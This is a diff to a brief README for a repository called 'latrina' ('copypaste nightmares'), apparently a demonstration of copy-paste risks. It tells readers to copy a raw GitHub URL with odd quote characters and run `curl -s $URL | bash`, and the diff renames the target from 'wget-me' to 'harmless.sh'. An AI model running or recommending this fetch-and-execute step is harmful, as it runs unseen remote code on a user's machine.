@@ -1,6 +1,6 @@
 # latrina
 copypaste nightmares 
-* go to https://raw.githubusercontent.com/kusky3/latrina/main/test''/wget-me
+* go to https://raw.githubusercontent.com/kusky3/latrina/main/test''/harmless.sh
 * read the content
 * copy the url  
 * run `curl -s $URL | bash` 
